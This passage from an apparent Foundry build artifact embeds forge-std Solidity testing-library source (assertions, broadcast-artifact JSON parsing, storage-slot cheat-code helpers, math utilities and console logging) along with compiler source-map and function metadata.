function assertApproxEqRel(\n        uint256 a,\n        uint256 b,\n        uint256 maxPercentDelta // An 18 decimal fixed point number, where 1e18 == 100%\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log                    (\"Error: a ~= b not satisfied [uint]\");\n            emit log_named_uint         (\"    Expected\", b);\n            emit log_named_uint         (\"      Actual\", a);\n            emit log_named_decimal_uint (\" Max % Delta\", maxPercentDelta, 18);\n            emit log_named_decimal_uint (\"     % Delta\", percentDelta, 18);\n            fail();\n        }\n    }\n\n    function assertApproxEqRel(\n        uint256 a,\n        uint256 b,\n        uint256 maxPercentDelta, // An 18 decimal fixed point number, where 1e18 == 100%\n        string memory err\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b, err); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log_named_string       (\"Error\", err);\n            assertApproxEqRel(a, b, maxPercentDelta);\n        }\n    }\n\n    function assertApproxEqRel(\n        int256 a,\n        int256 b,\n        uint256 maxPercentDelta\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log                   (\"Error: a ~= b not satisfied [int]\");\n            emit log_named_int         (\"    Expected\", b);\n            emit log_named_int         (\"      Actual\", a);\n            emit log_named_decimal_uint(\" Max % Delta\", maxPercentDelta, 18);\n            emit log_named_decimal_uint(\"     % Delta\", percentDelta, 18);\n            fail();\n        }\n    }\n\n    function assertApproxEqRel(\n        int256 a,\n        int256 b,\n        uint256 maxPercentDelta,\n        string memory err\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log_named_string      (\"Error\", err);\n            assertApproxEqRel(a, b, maxPercentDelta);\n        }\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                              JSON PARSING\n    //////////////////////////////////////////////////////////////*/\n\n   // Data structures to parse Transaction objects from the broadcast artifact\n   // that conform to EIP1559. The Raw structs is what is parsed from the JSON\n   // and then converted to the one that is used by the user for better UX.\n\n   struct RawTx1559 {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        // json value name = function\n        string functionSig;\n        bytes32 hash;\n        // json value name = tx\n        RawTx1559Detail txDetail;\n        // json value name = type\n        string opcode;\n    }\n\n    struct RawTx1559Detail {\n        AccessList[] accessList;\n        bytes data;\n        address from;\n        bytes gas;\n        bytes nonce;\n        address to;\n        bytes txType;\n        bytes value;\n    }\n\n    struct Tx1559 {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        string functionSig;\n        bytes32 hash;\n        Tx1559Detail txDetail;\n        string opcode;\n    }\n\n    struct Tx1559Detail {\n        AccessList[] accessList;\n        bytes data;\n        address from;\n        uint256 gas;\n        uint256 nonce;\n        address to;\n        uint256 txType;\n        uint256 value;\n    }\n\n   // Data structures to parse Transaction objects from the broadcast artifact\n   // that DO NOT conform to EIP1559. The Raw structs is what is parsed from the JSON\n   // and then converted to the one that is used by the user for better UX.\n\n    struct TxLegacy{\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        string functionSig;\n        string hash;\n        string opcode;\n        TxDetailLegacy transaction;\n    }\n\n    struct TxDetailLegacy{\n        AccessList[] accessList;\n        uint256 chainId;\n        bytes data;\n        address from;\n        uint256 gas;\n        uint256 gasPrice;\n        bytes32 hash;\n        uint256 nonce;\n        bytes1 opcode;\n        bytes32 r;\n        bytes32 s;\n        uint256 txType;\n        address to;\n        uint8 v;\n        uint256 value;\n    }\n\n    struct AccessList{\n        address accessAddress;\n        bytes32[] storageKeys;\n    }\n\n    // Data structures to parse Receipt objects from the broadcast artifact.\n    // The Raw structs is what is parsed from the JSON\n    // and then converted to the one that is used by the user for better UX.\n\n    struct RawReceipt {\n        bytes32 blockHash;\n        bytes blockNumber;\n        address contractAddress;\n        bytes cumulativeGasUsed;\n        bytes effectiveGasPrice;\n        address from;\n        bytes gasUsed;\n        RawReceiptLog[] logs;\n        bytes logsBloom;\n        bytes status;\n        address to;\n        bytes32 transactionHash;\n        bytes transactionIndex;\n    }\n\n    struct Receipt {\n        bytes32 blockHash;\n        uint256 blockNumber;\n        address contractAddress;\n        uint256 cumulativeGasUsed;\n        uint256 effectiveGasPrice;\n        address from;\n        uint256 gasUsed;\n        ReceiptLog[] logs;\n        bytes logsBloom;\n        uint256 status;\n        address to;\n        bytes32 transactionHash;\n        uint256 transactionIndex;\n    }\n\n    // Data structures to parse the entire broadcast artifact, assuming the\n    // transactions conform to EIP1559.\n\n    struct EIP1559ScriptArtifact {\n        string[] libraries;\n        string path;\n        string[] pending;\n        Receipt[] receipts;\n        uint256 timestamp;\n        Tx1559[] transactions;\n        TxReturn[] txReturns;\n    }\n\n    struct RawEIP1559ScriptArtifact {\n        string[] libraries;\n        string path;\n        string[] pending;\n        RawReceipt[] receipts;\n        TxReturn[] txReturns;\n        uint256 timestamp;\n        RawTx1559[] transactions;\n    }\n\n    struct RawReceiptLog {\n        // json value = address\n        address logAddress;\n        bytes32 blockHash;\n        bytes blockNumber;\n        bytes data;\n        bytes logIndex;\n        bool removed;\n        bytes32[] topics;\n        bytes32 transactionHash;\n        bytes transactionIndex;\n        bytes transactionLogIndex;\n    }\n\n    struct ReceiptLog {\n        // json value = address\n        address logAddress;\n        bytes32 blockHash;\n        uint256 blockNumber;\n        bytes data;\n        uint256 logIndex;\n        bytes32[] topics;\n        uint256 transactionIndex;\n        uint256 transactionLogIndex;\n        bool removed;\n    }\n\n    struct TxReturn {\n        string internalType;\n        string value;\n    }\n\n\n    function readEIP1559ScriptArtifact(string memory path)\n        internal\n        returns(EIP1559ScriptArtifact memory)\n    {\n        string memory data = vm.readFile(path);\n        bytes memory parsedData = vm.parseJson(data);\n        RawEIP1559ScriptArtifact memory rawArtifact = abi.decode(parsedData, (RawEIP1559ScriptArtifact));\n        EIP1559ScriptArtifact memory artifact;\n        artifact.libraries = rawArtifact.libraries;\n        artifact.path = rawArtifact.path;\n        artifact.timestamp = rawArtifact.timestamp;\n        artifact.pending = rawArtifact.pending;\n        artifact.txReturns = rawArtifact.txReturns;\n        artifact.receipts = rawToConvertedReceipts(rawArtifact.receipts);\n        artifact.transactions = rawToConvertedEIPTx1559s(rawArtifact.transactions);\n        return artifact;\n    }\n\n    function rawToConvertedEIPTx1559s(RawTx1559[] memory rawTxs)\n        internal pure\n        returns (Tx1559[] memory)\n    {\n        Tx1559[] memory txs = new Tx1559[](rawTxs.length);\n        for (uint i; i < rawTxs.length; i++) {\n            txs[i] = rawToConvertedEIPTx1559(rawTxs[i]);\n        }\n        return txs;\n    }\n\n    function rawToConvertedEIPTx1559(RawTx1559 memory rawTx)\n        internal pure\n        returns (Tx1559 memory)\n    {\n        Tx1559 memory transaction;\n        transaction.arguments = rawTx.arguments;\n        transaction.contractName = rawTx.contractName;\n        transaction.functionSig = rawTx.functionSig;\n        transaction.hash= rawTx.hash;\n        transaction.txDetail = rawToConvertedEIP1559Detail(rawTx.txDetail);\n        transaction.opcode= rawTx.opcode;\n        return transaction;\n    }\n\n    function rawToConvertedEIP1559Detail(RawTx1559Detail memory rawDetail)\n        internal pure\n        returns (Tx1559Detail memory)\n    {\n        Tx1559Detail memory txDetail;\n        txDetail.data = rawDetail.data;\n        txDetail.from = rawDetail.from;\n        txDetail.to = rawDetail.to;\n        txDetail.nonce = bytesToUint(rawDetail.nonce);\n        txDetail.txType = bytesToUint(rawDetail.txType);\n        txDetail.value = bytesToUint(rawDetail.value);\n        txDetail.gas = bytesToUint(rawDetail.gas);\n        txDetail.accessList = rawDetail.accessList;\n        return txDetail;\n\n    }\n\n    function readTx1559s(string memory path)\n        internal\n        returns (Tx1559[] memory)\n    {\n        string memory deployData = vm.readFile(path);\n        bytes memory parsedDeployData =\n            vm.parseJson(deployData, \".transactions\");\n        RawTx1559[] memory rawTxs = abi.decode(parsedDeployData, (RawTx1559[]));\n        return rawToConvertedEIPTx1559s(rawTxs);\n    }\n\n\n    function readTx1559(string memory path, uint256 index)\n        internal\n        returns (Tx1559 memory)\n    {\n        string memory deployData = vm.readFile(path);\n        string memory key = string(abi.encodePacked(\".transactions[\",vm.toString(index), \"]\"));\n        bytes memory parsedDeployData =\n            vm.parseJson(deployData, key);\n        RawTx1559 memory rawTx = abi.decode(parsedDeployData, (RawTx1559));\n        return rawToConvertedEIPTx1559(rawTx);\n    }\n\n\n    // Analogous to readTransactions, but for receipts.\n    function readReceipts(string memory path)\n        internal\n        returns (Receipt[] memory)\n    {\n        string memory deployData = vm.readFile(path);\n        bytes memory parsedDeployData = vm.parseJson(deployData, \".receipts\");\n        RawReceipt[] memory rawReceipts = abi.decode(parsedDeployData, (RawReceipt[]));\n        return rawToConvertedReceipts(rawReceipts);\n    }\n\n    function readReceipt(string memory path, uint index)\n        internal\n        returns (Receipt memory)\n    {\n        string memory deployData = vm.readFile(path);\n        string memory key = string(abi.encodePacked(\".receipts[\",vm.toString(index), \"]\"));\n        bytes memory parsedDeployData = vm.parseJson(deployData, key);\n        RawReceipt memory rawReceipt = abi.decode(parsedDeployData, (RawReceipt));\n        return rawToConvertedReceipt(rawReceipt);\n    }\n\n    function rawToConvertedReceipts(RawReceipt[] memory rawReceipts)\n        internal pure\n        returns(Receipt[] memory)\n    {\n        Receipt[] memory receipts = new Receipt[](rawReceipts.length);\n        for (uint i; i < rawReceipts.length; i++) {\n            receipts[i] = rawToConvertedReceipt(rawReceipts[i]);\n        }\n        return receipts;\n    }\n\n    function rawToConvertedReceipt(RawReceipt memory rawReceipt)\n        internal pure\n        returns(Receipt memory)\n    {\n        Receipt memory receipt;\n        receipt.blockHash = rawReceipt.blockHash;\n        receipt.to = rawReceipt.to;\n        receipt.from = rawReceipt.from;\n        receipt.contractAddress = rawReceipt.contractAddress;\n        receipt.effectiveGasPrice = bytesToUint(rawReceipt.effectiveGasPrice);\n        receipt.cumulativeGasUsed= bytesToUint(rawReceipt.cumulativeGasUsed);\n        receipt.gasUsed = bytesToUint(rawReceipt.gasUsed);\n        receipt.status = bytesToUint(rawReceipt.status);\n        receipt.transactionIndex = bytesToUint(rawReceipt.transactionIndex);\n        receipt.blockNumber = bytesToUint(rawReceipt.blockNumber);\n        receipt.logs = rawToConvertedReceiptLogs(rawReceipt.logs);\n        receipt.logsBloom = rawReceipt.logsBloom;\n        receipt.transactionHash = rawReceipt.transactionHash;\n        return receipt;\n    }\n\n    function rawToConvertedReceiptLogs(RawReceiptLog[] memory rawLogs)\n        internal pure\n        returns (ReceiptLog[] memory)\n    {\n        ReceiptLog[] memory logs = new ReceiptLog[](rawLogs.length);\n        for (uint i; i < rawLogs.length; i++) {\n            logs[i].logAddress = rawLogs[i].logAddress;\n            logs[i].blockHash = rawLogs[i].blockHash;\n            logs[i].blockNumber = bytesToUint(rawLogs[i].blockNumber);\n            logs[i].data = rawLogs[i].data;\n            logs[i].logIndex = bytesToUint(rawLogs[i].logIndex);\n            logs[i].topics = rawLogs[i].topics;\n            logs[i].transactionIndex = bytesToUint(rawLogs[i].transactionIndex);\n            logs[i].transactionLogIndex = bytesToUint(rawLogs[i].transactionLogIndex);\n            logs[i].removed = rawLogs[i].removed;\n        }\n        return logs;\n\n    }\n\n    function bytesToUint(bytes memory b) internal pure returns (uint256){\n            uint256 number;\n            for (uint i=0; i < b.length; i++) {\n                number = number + uint(uint8(b[i]))*(2**(8*(b.length-(i+1))));\n            }\n        return number;\n    }\n\n}\n\n/*//////////////////////////////////////////////////////////////////////////\n                                STD-ERRORS\n//////////////////////////////////////////////////////////////////////////*/\n\nlibrary stdError {\n    bytes public constant assertionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x01);\n    bytes public constant arithmeticError = abi.encodeWithSignature(\"Panic(uint256)\", 0x11);\n    bytes public constant divisionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x12);\n    bytes public constant enumConversionError = abi.encodeWithSignature(\"Panic(uint256)\", 0x21);\n    bytes public constant encodeStorageError = abi.encodeWithSignature(\"Panic(uint256)\", 0x22);\n    bytes public constant popError = abi.encodeWithSignature(\"Panic(uint256)\", 0x31);\n    bytes public constant indexOOBError = abi.encodeWithSignature(\"Panic(uint256)\", 0x32);\n    bytes public constant memOverflowError = abi.encodeWithSignature(\"Panic(uint256)\", 0x41);\n    bytes public constant zeroVarError = abi.encodeWithSignature(\"Panic(uint256)\", 0x51);\n    // DEPRECATED: Use Vm's `expectRevert` without any arguments instead\n    bytes public constant lowLevelError = bytes(\"\"); // `0x`\n}\n\n/*//////////////////////////////////////////////////////////////////////////\n                                STD-STORAGE\n//////////////////////////////////////////////////////////////////////////*/\n\nstruct StdStorage {\n    mapping (address => mapping(bytes4 => mapping(bytes32 => uint256))) slots;\n    mapping (address => mapping(bytes4 =>  mapping(bytes32 => bool))) finds;\n\n    bytes32[] _keys;\n    bytes4 _sig;\n    uint256 _depth;\n    address _target;\n    bytes32 _set;\n}\n\nlibrary stdStorage {\n    event SlotFound(address who, bytes4 fsig, bytes32 keysHash, uint slot);\n    event WARNING_UninitedSlot(address who, uint slot);\n\n    uint256 private constant UINT256_MAX = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\n    int256 private constant INT256_MAX = 57896044618658097711785492504343953926634992332820282019728792003956564819967;\n\n    Vm private constant vm_std_store = Vm(address(uint160(uint256(keccak256('hevm cheat code')))));\n\n    function sigs(\n        string memory sigStr\n    )\n        internal\n        pure\n        returns (bytes4)\n    {\n        return bytes4(keccak256(bytes(sigStr)));\n    }\n\n    /// @notice find an arbitrary storage slot given a function sig, input data, address of the contract and a value to check against\n    // slot complexity:\n    //  if flat, will be bytes32(uint256(uint));\n    //  if map, will be keccak256(abi.encode(key, uint(slot)));\n    //  if deep map, will be keccak256(abi.encode(key1, keccak256(abi.encode(key0, uint(slot)))));\n    //  if map struct, will be bytes32(uint256(keccak256(abi.encode(key1, keccak256(abi.encode(key0, uint(slot)))))) + structFieldDepth);\n    function find(\n        StdStorage storage self\n    )\n        internal\n        returns (uint256)\n    {\n        address who = self._target;\n        bytes4 fsig = self._sig;\n        uint256 field_depth = self._depth;\n        bytes32[] memory ins = self._keys;\n\n        // calldata to test against\n        if (self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))]) {\n            return self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))];\n        }\n        bytes memory cald = abi.encodePacked(fsig, flatten(ins));\n        vm_std_store.record();\n        bytes32 fdat;\n        {\n            (, bytes memory rdat) = who.staticcall(cald);\n            fdat = bytesToBytes32(rdat, 32*field_depth);\n        }\n\n        (bytes32[] memory reads, ) = vm_std_store.accesses(address(who));\n        if (reads.length == 1) {\n            bytes32 curr = vm_std_store.load(who, reads[0]);\n            if (curr == bytes32(0)) {\n                emit WARNING_UninitedSlot(who, uint256(reads[0]));\n            }\n            if (fdat != curr) {\n                require(false, \"stdStorage find(StdStorage): Packed slot. This would cause dangerous overwriting and currently isn't supported.\");\n            }\n            emit SlotFound(who, fsig, keccak256(abi.encodePacked(ins, field_depth)), uint256(reads[0]));\n            self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = uint256(reads[0]);\n            self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = true;\n        } else if (reads.length > 1) {\n            for (uint256 i = 0; i < reads.length; i++) {\n                bytes32 prev = vm_std_store.load(who, reads[i]);\n                if (prev == bytes32(0)) {\n                    emit WARNING_UninitedSlot(who, uint256(reads[i]));\n                }\n                // store\n                vm_std_store.store(who, reads[i], bytes32(hex\"1337\"));\n                bool success;\n                bytes memory rdat;\n                {\n                    (success, rdat) = who.staticcall(cald);\n                    fdat = bytesToBytes32(rdat, 32*field_depth);\n                }\n\n                if (success && fdat == bytes32(hex\"1337\")) {\n                    // we found which of the slots is the actual one\n                    emit SlotFound(who, fsig, keccak256(abi.encodePacked(ins, field_depth)), uint256(reads[i]));\n                    self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = uint256(reads[i]);\n                    self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))] = true;\n                    vm_std_store.store(who, reads[i], prev);\n                    break;\n                }\n                vm_std_store.store(who, reads[i], prev);\n            }\n        } else {\n            require(false, \"stdStorage find(StdStorage): No storage use detected for target.\");\n        }\n\n        require(self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))], \"stdStorage find(StdStorage): Slot(s) not found.\");\n\n        delete self._target;\n        delete self._sig;\n        delete self._keys;\n        delete self._depth;\n\n        return self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))];\n    }\n\n    function target(StdStorage storage self, address _target) internal returns (StdStorage storage) {\n        self._target = _target;\n        return self;\n    }\n\n    function sig(StdStorage storage self, bytes4 _sig) internal returns (StdStorage storage) {\n        self._sig = _sig;\n        return self;\n    }\n\n    function sig(StdStorage storage self, string memory _sig) internal returns (StdStorage storage) {\n        self._sig = sigs(_sig);\n        return self;\n    }\n\n    function with_key(StdStorage storage self, address who) internal returns (StdStorage storage) {\n        self._keys.push(bytes32(uint256(uint160(who))));\n        return self;\n    }\n\n    function with_key(StdStorage storage self, uint256 amt) internal returns (StdStorage storage) {\n        self._keys.push(bytes32(amt));\n        return self;\n    }\n    function with_key(StdStorage storage self, bytes32 key) internal returns (StdStorage storage) {\n        self._keys.push(key);\n        return self;\n    }\n\n    function depth(StdStorage storage self, uint256 _depth) internal returns (StdStorage storage) {\n        self._depth = _depth;\n        return self;\n    }\n\n    function checked_write(StdStorage storage self, address who) internal {\n        checked_write(self, bytes32(uint256(uint160(who))));\n    }\n\n    function checked_write(StdStorage storage self, uint256 amt) internal {\n        checked_write(self, bytes32(amt));\n    }\n\n    function checked_write(StdStorage storage self, bool write) internal {\n        bytes32 t;\n        /// @solidity memory-safe-assembly\n        assembly {\n            t := write\n        }\n        checked_write(self, t);\n    }\n\n    function checked_write(\n        StdStorage storage self,\n        bytes32 set\n    ) internal {\n        address who = self._target;\n        bytes4 fsig = self._sig;\n        uint256 field_depth = self._depth;\n        bytes32[] memory ins = self._keys;\n\n        bytes memory cald = abi.encodePacked(fsig, flatten(ins));\n        if (!self.finds[who][fsig][keccak256(abi.encodePacked(ins, field_depth))]) {\n            find(self);\n        }\n        bytes32 slot = bytes32(self.slots[who][fsig][keccak256(abi.encodePacked(ins, field_depth))]);\n\n        bytes32 fdat;\n        {\n            (, bytes memory rdat) = who.staticcall(cald);\n            fdat = bytesToBytes32(rdat, 32*field_depth);\n        }\n        bytes32 curr = vm_std_store.load(who, slot);\n\n        if (fdat != curr) {\n            require(false, \"stdStorage find(StdStorage): Packed slot. This would cause dangerous overwriting and currently isn't supported.\");\n        }\n        vm_std_store.store(who, slot, set);\n        delete self._target;\n        delete self._sig;\n        delete self._keys;\n        delete self._depth;\n    }\n\n    function read(StdStorage storage self) private returns (bytes memory) {\n        address t = self._target;\n        uint256 s = find(self);\n        return abi.encode(vm_std_store.load(t, bytes32(s)));\n    }\n\n    function read_bytes32(StdStorage storage self) internal returns (bytes32) {\n        return abi.decode(read(self), (bytes32));\n    }\n\n\n    function read_bool(StdStorage storage self) internal returns (bool) {\n        int256 v = read_int(self);\n        if (v == 0) return false;\n        if (v == 1) return true;\n        revert(\"stdStorage read_bool(StdStorage): Cannot decode. Make sure you are reading a bool.\");\n    }\n\n    function read_address(StdStorage storage self) internal returns (address) {\n        return abi.decode(read(self), (address));\n    }\n\n    function read_uint(StdStorage storage self) internal returns (uint256) {\n        return abi.decode(read(self), (uint256));\n    }\n\n    function read_int(StdStorage storage self) internal returns (int256) {\n        return abi.decode(read(self), (int256));\n    }\n\n    function bytesToBytes32(bytes memory b, uint offset) public pure returns (bytes32) {\n        bytes32 out;\n\n        uint256 max = b.length > 32 ? 32 : b.length;\n        for (uint i = 0; i < max; i++) {\n            out |= bytes32(b[offset + i] & 0xFF) >> (i * 8);\n        }\n        return out;\n    }\n\n    function flatten(bytes32[] memory b) private pure returns (bytes memory)\n    {\n        bytes memory result = new bytes(b.length * 32);\n        for (uint256 i = 0; i < b.length; i++) {\n            bytes32 k = b[i];\n            /// @solidity memory-safe-assembly\n            assembly {\n                mstore(add(result, add(32, mul(32, i))), k)\n            }\n        }\n\n        return result;\n    }\n\n\n\n}\n\n\n/*//////////////////////////////////////////////////////////////////////////\n                                STD-MATH\n//////////////////////////////////////////////////////////////////////////*/\n\nlibrary stdMath {\n    int256 private constant INT256_MIN = -57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    function abs(int256 a) internal pure returns (uint256) {\n        // Required or it will fail when `a = type(int256).min`\n        if (a == INT256_MIN)\n            return 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n        return uint256(a > 0 ? a : -a);\n    }\n\n    function delta(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a > b\n            ? a - b\n            : b - a;\n    }\n\n    function delta(int256 a, int256 b) internal pure returns (uint256) {\n        // a and b are of the same sign\n        // this works thanks to two's complement, the left-most bit is the sign bit\n        if ((a ^ b) > -1) {\n            return delta(abs(a), abs(b));\n        }\n\n        // a and b are of opposite signs\n        return abs(a) + abs(b);\n    }\n\n    function percentDelta(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 absDelta = delta(a, b);\n\n        return absDelta * 1e18 / b;\n    }\n\n    function percentDelta(int256 a, int256 b) internal pure returns (uint256) {\n        uint256 absDelta = delta(a, b);\n        uint256 absB = abs(b);\n\n        return absDelta * 1e18 / absB;\n    }\n}\n","sourceMap":"27684:8875:21:-:0;;;;;;;;;;;;;;;-1:-1:-1;;;27684:8875:21;;;;;;;;;;;;;;;;;","sourceMapDeployed":"27684:8875:21:-:0;;;;;;;;;;;;;;;;;;;;;;;;35854:297;;;;;;:::i;:::-;;:::i;:::-;;;1304:25:29;;;1292:2;1277:18;35854:297:21;;;;;;;;35928:7;35947:11;35969;35994:2;35983:1;:8;:13;:29;;36004:1;:8;35983:29;;;35999:2;35983:29;35969:43;;36027:6;36022:103;36043:3;36039:1;:7;36022:103;;;36108:5;:1;36112;36108:5;:::i;:::-;36082:1;36084:10;36093:1;36084:6;:10;:::i;:::-;36082:13;;;;;;;;:::i;:::-;;;;;-1:-1:-1;;;;;;36082:13:21;36074:40;;36067:47;;;;;36048:3;;;;:::i;:::-;;;;36022:103;;;-1:-1:-1;36141:3:21;;-1:-1:-1;;35854:297:21;;;;;:::o;14:127:29:-;75:10;70:3;66:20;63:1;56:31;106:4;103:1;96:15;130:4;127:1;120:15;146:999;223:6;231;284:2;272:9;263:7;259:23;255:32;252:52;;;300:1;297;290:12;252:52;340:9;327:23;369:18;410:2;402:6;399:14;396:34;;;426:1;423;416:12;396:34;464:6;453:9;449:22;439:32;;509:7;502:4;498:2;494:13;490:27;480:55;;531:1;528;521:12;480:55;567:2;554:16;589:2;585;582:10;579:36;;;595:18;;:::i;:::-;670:2;664:9;638:2;724:13;;-1:-1:-1;;720:22:29;;;744:2;716:31;712:40;700:53;;;768:18;;;788:22;;;765:46;762:72;;;814:18;;:::i;:::-;854:10;850:2;843:22;889:2;881:6;874:18;931:7;924:4;919:2;915;911:11;907:22;904:35;901:55;;;952:1;949;942:12;901:55;1012:2;1005:4;1001:2;997:13;990:4;982:6;978:17;965:50;1059:1;1052:4;1035:15;;;1031:26;;1024:37;1035:15;1118:20;;;;1105:34;;-1:-1:-1;;;;;;146:999:29:o;1340:127::-;1401:10;1396:3;1392:20;1389:1;1382:31;1432:4;1429:1;1422:15;1456:4;1453:1;1446:15;1472:168;1545:9;;;1576;;1593:15;;;1587:22;;1573:37;1563:71;;1614:18;;:::i;1645:125::-;1710:9;;;1731:10;;;1728:36;;;1744:18;;:::i;1775:127::-;1836:10;1831:3;1827:20;1824:1;1817:31;1867:4;1864:1;1857:15;1891:4;1888:1;1881:15;1907:135;1946:3;1967:17;;;1964:43;;1987:18;;:::i;:::-;-1:-1:-1;2034:1:29;2023:13;;1907:135::o","constructor":null,"functions":[{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdStorage:bytesToBytes32(bytes,uint256)(bytes32)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdStorage","signature":"bytesToBytes32(bytes,uint256):(bytes32)","shortSignature":"53584939","name":"bytesToBytes32","inputs":[{"name":"b","kind":"Bytes","internalType":"bytes"},{"name":"offset","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[{"name":"","kind":{"FixedBytes":32},"internalType":"bytes32"}],"stateMutability":"pure","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false}],"functionalLines":[]},{"name":"console","artifactPath":"out/console.sol/console.json","sourcePath":"node_modules/@pwnednomore/contracts/lib/forge-std/src/console.sol","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/console.sol:console","sourceFileId":23,"sourceContent":"// SPDX-License-Identifier: MIT\npragma solidity >=0.4.22 <0.9.0;\n\nlibrary console {\n    address constant CONSOLE_ADDRESS = address(0x000000000000000000636F6e736F6c652e6c6f67);\n\n    function _sendLogPayload(bytes memory payload) private view {\n        uint256 payloadLength = payload.length;\n        address consoleAddress = CONSOLE_ADDRESS;\n        /// @solidity memory-safe-assembly\n        assembly {\n            let payloadStart := add(payload, 32)\n            let r := staticcall(gas(), consoleAddress, payloadStart, payloadLength, 0, 0)\n        }\n    }\n\n    function log() internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log()\"));\n    }\n\n    function logInt(int p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(int)\", p0));\n    }\n\n    function logUint(uint p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint)\", p0));\n    }\n\n    function logString(string memory p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string)\", p0));\n    }\n\n    function logBool(bool p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool)\", p0));\n    }\n\n    function logAddress(address p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address)\", p0));\n    }\n\n    function logBytes(bytes memory p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes)\", p0));\n    }\n\n    function logBytes1(bytes1 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes1)\", p0));\n    }\n\n    function logBytes2(bytes2 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes2)\", p0));\n    }\n\n    function logBytes3(bytes3 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes3)\", p0));\n    }\n\n    function logBytes4(bytes4 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes4)\", p0));\n    }\n\n    function logBytes5(bytes5 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes5)\", p0));\n    }\n\n    function logBytes6(bytes6 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes6)\", p0));\n    }\n\n    function logBytes7(bytes7 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes7)\", p0));\n    }\n\n    function logBytes8(bytes8 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes8)\", p0));\n    }\n\n    function logBytes9(bytes9 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes9)\", p0));\n    }\n\n    function logBytes10(bytes10 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes10)\", p0));\n    }\n\n    function logBytes11(bytes11 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes11)\", p0));\n    }\n\n    function logBytes12(bytes12 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes12)\", p0));\n    }\n\n    function logBytes13(bytes13 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes13)\", p0));\n    }\n\n    function logBytes14(bytes14 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes14)\", p0));\n    }\n\n    function logBytes15(bytes15 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes15)\", p0));\n    }\n\n    function logBytes16(bytes16 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes16)\", p0));\n    }\n\n    function logBytes17(bytes17 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes17)\", p0));\n    }\n\n    function logBytes18(bytes18 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes18)\", p0));\n    }\n\n    function logBytes19(bytes19 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes19)\", p0));\n    }\n\n    function logBytes20(bytes20 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes20)\", p0));\n    }\n\n    function logBytes21(bytes21 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes21)\", p0));\n    }\n\n    function logBytes22(bytes22 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes22)\", p0));\n    }\n\n    function logBytes23(bytes23 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes23)\", p0));\n    }\n\n    function logBytes24(bytes24 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes24)\", p0));\n    }\n\n    function logBytes25(bytes25 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes25)\", p0));\n    }\n\n    function logBytes26(bytes26 p0) 